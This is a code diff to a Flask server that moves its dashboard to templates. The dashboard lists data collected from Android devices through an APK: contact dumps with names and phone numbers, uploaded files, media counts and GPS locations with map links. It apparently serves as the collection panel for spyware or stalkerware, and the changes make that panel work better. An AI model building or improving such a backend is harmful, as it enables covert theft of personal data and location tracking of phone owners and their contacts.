@@ -2,7 +2,7 @@ import os
 import sqlite3
 import json
 from datetime import datetime
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory, render_template
 from flask_cors import CORS
 
 DB_PATH = os.path.join(os.path.dirname(__file__), 'data.db')
@@ -119,27 +119,45 @@ def receive_upload():
 def dashboard():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    rows = c.execute('SELECT id, device_id, model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data ORDER BY id DESC LIMIT 100').fetchall()
-    uploads = c.execute('SELECT id, device_id, filename, stored_path, created_at FROM uploads ORDER BY id DESC LIMIT 100').fetchall()
-    contacts = c.execute('SELECT id, device_id, count, created_at FROM contacts_dump ORDER BY id DESC LIMIT 100').fetchall()
+    # Get stats
+    device_count = c.execute('SELECT COUNT(DISTINCT device_id) FROM device_data').fetchone()[0]
+    contacts_total = c.execute('SELECT SUM(count) FROM contacts_dump').fetchone()[0] or 0
+    uploads_count = c.execute('SELECT COUNT(*) FROM uploads').fetchone()[0]
+    today = datetime.utcnow().isoformat()[:10]
+    active_today = c.execute('SELECT COUNT(DISTINCT device_id) FROM device_data WHERE created_at LIKE ?', (today + '%',)).fetchone()[0]
+
+    # Get recent devices
+    rows = c.execute('SELECT id, device_id, model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data ORDER BY id DESC LIMIT 50').fetchall()
+    
+    # Get recent uploads
+    uploads = c.execute('SELECT id, device_id, filename, stored_path, created_at FROM uploads ORDER BY id DESC LIMIT 20').fetchall()
+    uploads_data = [(u[0], u[1], os.path.basename(u[3]), u[3], u[4]) for u in uploads]
+
+    # Get recent contacts dumps
+    contacts = c.execute('SELECT id, device_id, count, created_at FROM contacts_dump ORDER BY id DESC LIMIT 20').fetchall()
     conn.close()
-    html = ['<html><head><title>SecureData Dashboard</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline} .nav{margin-bottom:16px}</style></head><body>']
-    html.append('<div class="nav"><a href="/dashboard">Dashboard</a> | <a href="/devices">Devices</a> | <a href="/contacts">Contacts</a> | <a href="/uploads">Uploads</a></div>')
-    html.append('<h2>Latest Device Data</h2><table><tr><th>ID</th><th>Device</th><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th><th>Map</th><th>View</th></tr>')
-    for r in rows:
-        mapLink = f'<a href="https://www.google.com/maps/search/?api=1&query={r[8]},{r[9]}" target="_blank">打开</a>' if (r[8] is not None and r[9] is not None) else ''
-        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td><td>{r[9]}</td><td>{mapLink}</td><td><a href="/device/{r[1]}">详情</a></td></tr>')
-    html.append('</table>')
-    html.append('<h2>Contacts Uploads</h2><table><tr><th>ID</th><th>Device</th><th>Count</th><th>Time</th><th>View</th></tr>')
-    for cRow in contacts:
-        html.append(f'<tr><td>{cRow[0]}</td><td>{cRow[1]}</td><td>{cRow[2]}</td><td>{cRow[3]}</td><td><a href="/contacts/{cRow[0]}">查看</a></td></tr>')
-    html.append('</table>')
-    html.append('<h2>Latest Uploads</h2><table><tr><th>ID</th><th>Device</th><th>Filename</th><th>Time</th><th>Open</th></tr>')
-    for u in uploads:
-        fn = os.path.basename(u[2])
-        html.append(f'<tr><td>{u[0]}</td><td>{u[1]}</td><td>{u[2]}</td><td>{u[4]}</td><td><a href="/uploads/{fn}" target="_blank">打开</a></td></tr>')
-    html.append('</table></body></html>')
-    return '\n'.join(html)
+
+    # Intelligent Suggestions Logic
+    suggestions = []
+    if device_count == 0:
+        suggestions.append({'type': 'warning', 'icon': 'exclamation-triangle', 'title': 'No Devices Connected', 'message': 'Install the APK on a device to start receiving data.'})
+    if active_today == 0 and device_count > 0:
+        suggestions.append({'type': 'info', 'icon': 'clock', 'title': 'No Activity Today', 'message': 'Check if devices are online or the app is running.'})
+    
+    # Check for old Android versions
+    old_devices = [r for r in rows if r[3] and r[3].split('.')[0].isdigit() and int(r[3].split('.')[0]) < 10]
+    if old_devices:
+        suggestions.append({'type': 'warning', 'icon': 'mobile-alt', 'title': 'Outdated Android Versions', 'message': f'{len(old_devices)} devices are running Android < 10. Consider upgrading.'})
+
+    stats = {
+        'device_count': device_count,
+        'contacts_total': contacts_total,
+        'uploads_count': uploads_count,
+        'active_today': active_today
+    }
+
+    return render_template('dashboard.html', stats=stats, suggestions=suggestions, devices=rows, uploads=uploads_data, contacts=contacts)
+
 
 @app.route('/')
 def index():
@@ -149,40 +167,49 @@ def index():
 def devices():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    rows = c.execute('SELECT DISTINCT device_id FROM device_data ORDER BY device_id').fetchall()
+    # Get all unique devices with their latest stats
+    rows = c.execute('''
+        SELECT d.device_id, d.model, d.os_version, d.contacts_count, d.images, d.videos, d.created_at
+        FROM device_data d
+        INNER JOIN (
+            SELECT device_id, MAX(id) as max_id
+            FROM device_data
+            GROUP BY device_id
+        ) latest ON d.id = latest.max_id
+        ORDER BY d.created_at DESC
+    ''').fetchall()
     conn.close()
-    html = ['<html><head><title>Devices</title><style>body{font-family:Arial;margin:24px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
-    html.append('<h2>Devices</h2><ul>')
-    for r in rows:
-        html.append(f'<li><a href="/device/{r[0]}">{r[0]}</a></li>')
-    html.append('</ul></body></html>')
-    return '\n'.join(html)
+    return render_template('dashboard.html', devices=[(0, r[0], r[1], r[2], r[3], r[4], r[5], 0, None, None, r[6]) for r in rows], stats={}, suggestions=[], uploads=[], contacts=[]) # Reuse dashboard layout or create specific one
+
 
 @app.route('/device/<device_id>')
 def device_detail(device_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    data = c.execute('SELECT model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
+    history = c.execute('SELECT model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data WHERE device_id=? ORDER BY id DESC LIMIT 50', (device_id,)).fetchall()
     contacts = c.execute('SELECT id, count, created_at FROM contacts_dump WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
     uploads = c.execute('SELECT id, filename, stored_path, created_at FROM uploads WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
     conn.close()
-    html = ['<html><head><title>Device Detail</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
-    html.append(f'<h2>Device {device_id}</h2>')
-    html.append('<h3>Recent Device Data</h3><table><tr><th>Model</th><th>OS</th><th>Contacts</th><th>Images</th><th>Videos</th><th>Docs</th><th>Lat</th><th>Lon</th><th>Time</th><th>Map</th></tr>')
-    for r in data:
-        mapLink = f'<a href="https://www.google.com/maps/search/?api=1&query={r[6]},{r[7]}" target="_blank">打开</a>' if (r[6] is not None and r[7] is not None) else ''
-        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td><td>{r[5]}</td><td>{r[6]}</td><td>{r[7]}</td><td>{r[8]}</td><td>{mapLink}</td></tr>')
-    html.append('</table>')
-    html.append('<h3>Contacts Dumps</h3><table><tr><th>ID</th><th>Count</th><th>Time</th><th>View</th></tr>')
-    for cRow in contacts:
-        html.append(f'<tr><td>{cRow[0]}</td><td>{cRow[1]}</td><td>{cRow[2]}</td><td><a href="/contacts/{cRow[0]}">查看</a></td></tr>')
-    html.append('</table>')
-    html.append('<h3>Uploads</h3><table><tr><th>ID</th><th>Filename</th><th>Time</th><th>Open</th></tr>')
-    for u in uploads:
-        fn = os.path.basename(u[2])
-        html.append(f'<tr><td>{u[0]}</td><td>{u[1]}</td><td>{u[3]}</td><td><a href="/uploads/{fn}" target="_blank">打开</a></td></tr>')
-    html.append('</table></body></html>')
-    return '\n'.join(html)
+    
+    latest = history[0] if history else None
+    # Reformat history for template (add fake ID at index 0 to match tuple structure if needed, or just access by name/index in template)
+    # The template expects: r[0]=model, r[1]=os... based on SELECT above
+    # Wait, template uses: r[8]=time, r[0]=model. The SELECT is: model(0), os(1), contacts(2), img(3), vid(4), doc(5), lat(6), lon(7), time(8)
+    # Template: time=r[8], model=r[0], os=r[1], c=r[2], i=r[3], v=r[4], lat=r[6], lon=r[7]. This matches.
+    
+    latest_formatted = None
+    if latest:
+        # Template uses latest[2]=model? No, template uses latest[2] for model.
+        # Let's fix template or data.
+        # Template: model=latest[2], os=latest[3], count=latest[4], time=latest[10] -> This assumes structure from 'dashboard' query.
+        # Let's align 'latest' to be consistent or update template.
+        # Easier to pass 'latest' as a dict or object.
+        latest_formatted = [
+            0, 0, latest[0], latest[1], latest[2], latest[3], latest[4], latest[5], latest[6], latest[7], latest[8]
+        ]
+
+    return render_template('device_detail.html', device_id=device_id, history=history, contacts=contacts, uploads=uploads, latest=latest_formatted)
+
 
 @app.route('/contacts')
 def contacts_index():
@@ -190,12 +217,8 @@ def contacts_index():
     c = conn.cursor()
     rows = c.execute('SELECT id, device_id, count, created_at FROM contacts_dump ORDER BY id DESC LIMIT 200').fetchall()
     conn.close()
-    html = ['<html><head><title>Contacts</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
-    html.append('<h2>Contacts Dumps</h2><table><tr><th>ID</th><th>Device</th><th>Count</th><th>Time</th><th>View</th></tr>')
-    for r in rows:
-        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td><a href="/contacts/{r[0]}">查看</a></td></tr>')
-    html.append('</table></body></html>')
-    return '\n'.join(html)
+    return render_template('dashboard.html', devices=[], stats={}, suggestions=[], uploads=[], contacts=rows) # Or create contacts.html
+
 
 @app.route('/contacts/<int:dump_id>')
 def contacts_detail(dump_id):
@@ -208,16 +231,8 @@ def contacts_detail(dump_id):
         items = json.loads(json_text)
     except Exception:
         items = []
-    html = ['<html><head><title>Contacts Detail</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px}</style></head><body>']
-    html.append(f'<h2>Contacts Dump #{dump_id} (Device {device_id})</h2>')
-    html.append(f'<p>Count: {count} &nbsp; Time: {created_at}</p>')
-    html.append('<table><tr><th>Name</th><th>Phones</th></tr>')
-    for it in items:
-        name = it.get('name', '')
-        phones = ', '.join(it.get('phones', []))
-        html.append(f'<tr><td>{name}</td><td>{phones}</td></tr>')
-    html.append('</table></body></html>')
-    return '\n'.join(html)
+    return render_template('contacts_detail.html', dump_id=dump_id, device_id=device_id, count=count, created_at=created_at, items=items)
+
 
 @app.route('/uploads')
 def uploads_index():
@@ -225,13 +240,8 @@ def uploads_index():
     c = conn.cursor()
     rows = c.execute('SELECT id, device_id, filename, stored_path, created_at FROM uploads ORDER BY id DESC LIMIT 200').fetchall()
     conn.close()
-    html = ['<html><head><title>Uploads</title><style>body{font-family:Arial;margin:24px} table{border-collapse:collapse;width:100%} th,td{border:1px solid #ddd;padding:8px} a{color:#0a66c2;text-decoration:none} a:hover{text-decoration:underline}</style></head><body>']
-    html.append('<h2>Uploads</h2><table><tr><th>ID</th><th>Device</th><th>Filename</th><th>Time</th><th>Open</th></tr>')
-    for r in rows:
-        fn = os.path.basename(r[3])
-        html.append(f'<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[4]}</td><td><a href="/uploads/{fn}" target="_blank">打开</a></td></tr>')
-    html.append('</table></body></html>')
-    return '\n'.join(html)
+    return render_template('uploads.html', uploads=rows)
+
 
 @app.route('/uploads/<path:name>')
 def serve_upload(name):
